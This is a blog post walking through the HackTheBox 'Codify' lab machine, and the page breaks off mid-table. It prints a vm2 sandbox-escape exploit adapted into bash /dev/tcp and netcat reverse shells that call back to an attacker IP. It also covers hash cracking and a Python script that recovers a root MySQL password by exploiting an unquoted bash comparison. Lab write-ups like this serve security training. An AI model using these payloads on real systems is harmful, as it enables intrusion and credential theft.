@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Codify HTB Walkthrough · Chief Dennis&#39; Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Dennis Drebitca">
+<meta name="description" content="The Codify HTB machine is a easy difficulty level HackTheBox Linux Machine. The main techniques used to crack this machine are:
+- Hash cracking with JohnTheRipper- Sandbox escape- Bahs Script Analysis- Python ScriptingReconnaissanceLink to headingI started by running a NMAP scan to look for services and versions running on open ports;
+We can see that the usual ports 22 and 80 are open. However, port 3000 is also open running node.">
+<meta name="keywords" content="blog,developer,personal,cybersecurity,IT,cloud">
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Codify HTB Walkthrough"/>
+<meta name="twitter:description" content="The Codify HTB machine is a easy difficulty level HackTheBox Linux Machine. The main techniques used to crack this machine are:
+- Hash cracking with JohnTheRipper- Sandbox escape- Bahs Script Analysis- Python ScriptingReconnaissanceLink to headingI started by running a NMAP scan to look for services and versions running on open ports;
+We can see that the usual ports 22 and 80 are open. However, port 3000 is also open running node."/>
+
+<meta property="og:title" content="Codify HTB Walkthrough" />
+<meta property="og:description" content="The Codify HTB machine is a easy difficulty level HackTheBox Linux Machine. The main techniques used to crack this machine are:
+- Hash cracking with JohnTheRipper- Sandbox escape- Bahs Script Analysis- Python ScriptingReconnaissanceLink to headingI started by running a NMAP scan to look for services and versions running on open ports;
+We can see that the usual ports 22 and 80 are open. However, port 3000 is also open running node." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chiefdennis.github.io/posts/htb_codify/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-13T13:07:16+01:00" />
+<meta property="article:modified_time" content="2023-09-13T13:07:16+01:00" />
+
+
+
+
+
+<link rel="canonical" href="https://chiefdennis.github.io/posts/htb_codify/">
+
+
+<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.e1bdf152d93b060b06ba5d496486ed9c201a8b95d335e035beb5faebe3b61cad.css" integrity="sha256-4b3xUtk7BgsGul1JZIbtnCAai5XTNeA1vrX66&#43;O2HK0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Chief Dennis&#39; Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">HTB Machines</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/projects/">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/contact/">Contact me</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://chiefdennis.github.io/posts/htb_codify/">
+              Codify HTB Walkthrough
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2023-09-13T13:07:16&#43;01:00">
+                September 13, 2023
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              6-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa fa-user" aria-hidden="true"></i>
+    <a href="/authors/dennis-drebitca/">Dennis Drebitca</a></div>
+
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p><img src="codify.png" alt="image"></p>
+<p>The Codify HTB machine is a easy difficulty level HackTheBox Linux Machine. The main techniques used to crack this machine are:</p>
+<pre><code>- Hash cracking with JohnTheRipper
+- Sandbox escape
+- Bahs Script Analysis
+- Python Scripting
+</code></pre>
+<h2 id="reconnaissance">
+  Reconnaissance
+  <a class="heading-link" href="#reconnaissance">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>I started by running a NMAP scan to look for services and versions running on open ports;</p>
+<p><img src="nmap.png" alt="image"></p>
+<p>We can see that the usual ports 22 and 80 are open. However, port 3000 is also open running node.js, which could be useful in the future since node.js has some known vulnerabilities in older versions.</p>
+<p>Addming codify.htb to our /etc/hosts, we can access the website and take a look.</p>
+<p>The website is made of 3 pages:</p>
+<pre><code>- About us - This page explained that Codify is a Node.js sandbox environment using the vm2 library to execute untrusted code safely.
+- Editor - A simple page with a text area to enter Node.js code and execute it.
+- Limitations - Notes restrictions like blocked access to certain modules like child_process and fs
+</code></pre>
+<p>In the &rsquo;editor&rsquo; page, we can write and execute node.js code.</p>
+<p>In the &lsquo;about us&rsquo; page, we can see the references to vm2 sandboxing for code execution:</p>
+<p><img src="1.png" alt="image"></p>
+<h2 id="initial-access">
+  Initial access
+  <a class="heading-link" href="#initial-access">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>However, vm2 is not completely bulletproof. I found this exploit on GitHub:</p>
+<p><a href="https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac"  class="external-link" target="_blank" rel="noopener">https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac</a></p>
+<p>The code is the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">VM</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm2&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VM</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="sb">`
+</span></span></span><span class="line"><span class="cl"><span class="sb">  const err = new Error();
+</span></span></span><span class="line"><span class="cl"><span class="sb">  err.name = {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    toString: new Proxy(() =&gt; &#34;&#34;, {
+</span></span></span><span class="line"><span class="cl"><span class="sb">      apply(target, thiz, args) {
+</span></span></span><span class="line"><span class="cl"><span class="sb">        const process = args.constructor.constructor(&#34;return process&#34;)();
+</span></span></span><span class="line"><span class="cl"><span class="sb">        throw process.mainModule.require(&#34;child_process&#34;).execSync(&#34;echo hacked&#34;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">      },
+</span></span></span><span class="line"><span class="cl"><span class="sb">    }),
+</span></span></span><span class="line"><span class="cl"><span class="sb">  };
+</span></span></span><span class="line"><span class="cl"><span class="sb">  try {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    err.stack;
+</span></span></span><span class="line"><span class="cl"><span class="sb">  } catch (stdout) {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    stdout;
+</span></span></span><span class="line"><span class="cl"><span class="sb">  }
+</span></span></span><span class="line"><span class="cl"><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span> <span class="c1">// -&gt; hacked
+</span></span></span></code></pre></div><p>We can surely modify this script to get a reverse shell. However, it can be tricky because code execution is sandboxed and restricted.</p>
+<p>My first attempt at getting the reverse shell went as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">VM</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm2&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VM</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="sb">`
+</span></span></span><span class="line"><span class="cl"><span class="sb">  const err = new Error();
+</span></span></span><span class="line"><span class="cl"><span class="sb">  err.name = {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    toString: new Proxy(() =&gt; &#34;&#34;, {
+</span></span></span><span class="line"><span class="cl"><span class="sb">      apply(target, thiz, args) {
+</span></span></span><span class="line"><span class="cl"><span class="sb">        const process = args.constructor.constructor(&#34;return process&#34;)();
+</span></span></span><span class="line"><span class="cl"><span class="sb">        throw process.mainModule.require(&#34;child_process&#34;).execSync(&#34;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.15.33/1234 0&gt;&amp;1&#34;&#34;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">      },
+</span></span></span><span class="line"><span class="cl"><span class="sb">    }),
+</span></span></span><span class="line"><span class="cl"><span class="sb">  };
+</span></span></span><span class="line"><span class="cl"><span class="sb">  try {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    err.stack;
+</span></span></span><span class="line"><span class="cl"><span class="sb">  } catch (stdout) {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    stdout;
+</span></span></span><span class="line"><span class="cl"><span class="sb">  }
+</span></span></span><span class="line"><span class="cl"><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span> <span class="c1">// -&gt; hacked
+</span></span></span></code></pre></div><p>Which did&rsquo;t work. I messed around with different reverse shells, until I tried the following code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">VM</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm2&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VM</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="sb">`
+</span></span></span><span class="line"><span class="cl"><span class="sb">  const err = new Error();
+</span></span></span><span class="line"><span class="cl"><span class="sb">  err.name = {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    toString: new Proxy(() =&gt; &#34;&#34;, {
+</span></span></span><span class="line"><span class="cl"><span class="sb">      apply(target, thiz, args) {
+</span></span></span><span class="line"><span class="cl"><span class="sb">        const process = args.constructor.constructor(&#34;return process&#34;)();
+</span></span></span><span class="line"><span class="cl"><span class="sb">        throw process.mainModule.require(&#34;child_process&#34;).execSync(&#34;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.33 1234 &gt;/tmp/f&#34;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">      },
+</span></span></span><span class="line"><span class="cl"><span class="sb">    }),
+</span></span></span><span class="line"><span class="cl"><span class="sb">  };
+</span></span></span><span class="line"><span class="cl"><span class="sb">  try {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    err.stack;
+</span></span></span><span class="line"><span class="cl"><span class="sb">  } catch (stdout) {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    stdout;
+</span></span></span><span class="line"><span class="cl"><span class="sb">  }
+</span></span></span><span class="line"><span class="cl"><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span> <span class="c1">// -&gt; hacked
+</span></span></span></code></pre></div><p>The command run to get the reverse shell has been found in the ironhacker.es website.</p>
+<p><a href="https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/"  class="external-link" target="_blank" rel="noopener">https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rm -f /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 10.10.15.33 <span class="m">1234</span> &gt;/tmp/f
+</span></span></code></pre></div><p>This reverse shell code is very different from the usual. It uses the netcat utility to establish the connection. Then we run the following commands to get a full interactive TTY:</p>
+<p><img src="3.png" alt="image"></p>
+<h2 id="switching-users-to-joshua">
+  Switching users to Joshua
+  <a class="heading-link" href="#switching-users-to-joshua">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Doing some recon, I&rsquo;ve found some interesting files:</p>
+<p><img src="4.png" alt="image"></p>
+<p>It looks like there is a mysql database. By browsing the tickets.db database, we get the user and hashed password for the user joshua.</p>
+<p><img src="5.png" alt="image">]</p>
+<p>The hash we obtained is the following. Using JohnTheRipper, we can crack the hash and get the plain text password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">$</span><span class="mi">2</span><span class="n">a</span><span class="err">$</span><span class="mi">12</span><span class="err">$</span><span class="n">SOn8Pf6z8fO</span><span class="o">/</span><span class="n">nVsNbAAequ</span><span class="o">/</span><span class="n">P6vLRJJl7gCUEiYBU2iLHn4G</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">Zw2</span>
+</span></span></code></pre></div><p><img src="6.png" alt="image"></p>
+<p>Now, we can log in as Joshua and get the user flag.</p>
+<h2 id="privilege-escalation">
+  Privilege escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Launching pspy64 on the machine to see what processes are running, we discover that an interesting non-common script is being run as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mo">06</span> <span class="mi">11</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="mi">33</span> <span class="nl">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>     <span class="n">PID</span><span class="o">=</span><span class="mi">69669</span>  <span class="o">|</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">mysql</span><span class="o">-</span><span class="n">backup</span><span class="p">.</span><span class="n">sh</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mo">06</span> <span class="mi">11</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="mi">33</span> <span class="nl">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">1000</span>  <span class="n">PID</span><span class="o">=</span><span class="mi">69668</span>  <span class="o">|</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">echo</span> <span class="n">perfect1</span> <span class="o">|</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">mysql</span><span class="o">-</span><span class="n">backup</span><span class="p">.</span><span class="n">sh</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mo">06</span> <span class="mi">11</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="mi">33</span> <span class="nl">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>     <span class="n">PID</span><span class="o">=</span><span class="mi">69671</span>  <span class="o">|</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">mysql</span><span class="o">-</span><span class="n">backup</span><span class="p">.</span><span class="n">sh</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mo">06</span> <span class="mi">11</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="mi">33</span> <span class="nl">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>     <span class="n">PID</span><span class="o">=</span><span class="mi">69670</span>  <span class="o">|</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">mysql</span><span class="o">-</span><span class="n">backup</span><span class="p">.</span><span class="n">sh</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mo">06</span> <span class="mi">11</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="mi">33</span> <span class="nl">CMD</span><span class="p">:</span> <span class="n">UID</span><span class="o">=</span><span class="mi">0</span>     <span class="n">PID</span><span class="o">=</span><span class="mi">69673</span>  <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span> 
+</span></span></code></pre></div><p>The content of the script mysql-backup.sh is the following. It is a simple script that backups the mysql databases stored on the machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nv">DB_USER</span><span class="o">=</span><span class="s2">&#34;root&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">DB_PASS</span><span class="o">=</span><span class="k">$(</span>/usr/bin/cat /root/.creds<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">BACKUP_DIR</span><span class="o">=</span><span class="s2">&#34;/var/backups/mysql&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">read</span> -s -p <span class="s2">&#34;Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: &#34;</span> USER_PASS
+</span></span><span class="line"><span class="cl">/usr/bin/echo
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        /usr/bin/echo <span class="s2">&#34;Password confirmed!&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">        /usr/bin/echo <span class="s2">&#34;Password confirmation failed!&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/mkdir -p <span class="s2">&#34;</span><span class="nv">$BACKUP_DIR</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">databases</span><span class="o">=</span><span class="k">$(</span>/usr/bin/mysql -u <span class="s2">&#34;</span><span class="nv">$DB_USER</span><span class="s2">&#34;</span> -h 0.0.0.0 -P <span class="m">3306</span> -p<span class="s2">&#34;</span><span class="nv">$DB_PASS</span><span class="s2">&#34;</span> -e <span class="s2">&#34;SHOW DATABASES;&#34;</span> <span class="p">|</span> /usr/bin/grep -Ev <span class="s2">&#34;(Database|information_schema|performance_schema)&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> db in <span class="nv">$databases</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;Backing up database: </span><span class="nv">$db</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/mysqldump --force -u <span class="s2">&#34;</span><span class="nv">$DB_USER</span><span class="s2">&#34;</span> -h 0.0.0.0 -P <span class="m">3306</span> -p<span class="s2">&#34;</span><span class="nv">$DB_PASS</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$db</span><span class="s2">&#34;</span> <span class="p">|</span> /usr/bin/gzip &gt; <span class="s2">&#34;</span><span class="nv">$BACKUP_DIR</span><span class="s2">/</span><span class="nv">$db</span><span class="s2">.sql.gz&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/echo <span class="s2">&#34;All databases backed up successfully!&#34;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/echo <span class="s2">&#34;Changing the permissions&#34;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/chown root:sys-adm <span class="s2">&#34;</span><span class="nv">$BACKUP_DIR</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/chmod <span class="m">774</span> -R <span class="s2">&#34;</span><span class="nv">$BACKUP_DIR</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/echo <span class="s1">&#39;Done!&#39;</span>
+</span></span></code></pre></div><p>At first, I tried a brute-force approach. Since there is no rate limiting, we can try as many passwords as we want to try and guess it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dictionary</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/home/kali/SecLists/Passwords/Leaked-Databases/rockyou.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">dictionary</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;echo&#39;</span><span class="p">,</span><span class="n">dictionary</span><span class="o">.</span><span class="n">readline</span><span class="p">(),</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="s1">&#39;sudo&#39;</span><span class="p">,</span><span class="s1">&#39;/opt/scripts/mysql-backup.sh&#39;</span><span class="p">],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">output</span><span class="o">.</span><span class="n">stdout</span> <span class="o">!=</span> <span class="s1">&#39;Password confirmation failed!&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Password is&#39;</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></div><p>This did not work because this brute-force approach is not right. The vulnerability lies in the comparison in the script. While researching potential security risks in Bash scripts, I discovered an unsafe practice in the MySQL bash script: unquoted variable comparison.</p>
+<p>So, the script interprets the input, and we can try a*, b*, c*&hellip;, guessing the password char by char. This python script does just that:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dictionary</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">found</span><span class="o">=</span><span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">found</span><span class="o">==</span><span class="kc">False</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">dictionary</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">command</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;echo &#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39;* | sudo /opt/scripts/mysql-backup.sh&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;confirmed&#34;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">password</span><span class="o">+=</span><span class="n">char</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">found</span><span class="o">=</span><span class="kc">True</span>
+</span></span></code></pre></div><p>This is the output of the script in the command line:</p>
+<p><img src="7.png" alt="image"></p>
+<p>And we get the password, which is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kljh12k3jhaskjh12kjh3
+</span></span></code></pre></div><p>Now we log in to the database to snoop around.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">joshua@codify:/tmp/den$ /usr/bin/mysql -u <span class="s2">&#34;root&#34;</span> -h 0.0.0.0 -P <span class="m">3306</span> -p<span class="s2">&#34;kljh12k3jhaskjh12kjh3&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mysql&gt; SELECT Host, User, Password FROM user
+</span></span><span class="line"><span class="cl">    -&gt; <span class="se">\g</span>
+</span></span><span class="line"><span class="cl">+-----------+-------------+-------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Host      <span class="p">|</span> User        <span class="p">|</span> Password                                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-----------+-------------+-------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> localhost <span class="p">|</span> mariadb.sys <span class="p">|</span>                                           <span class="p">|</span>
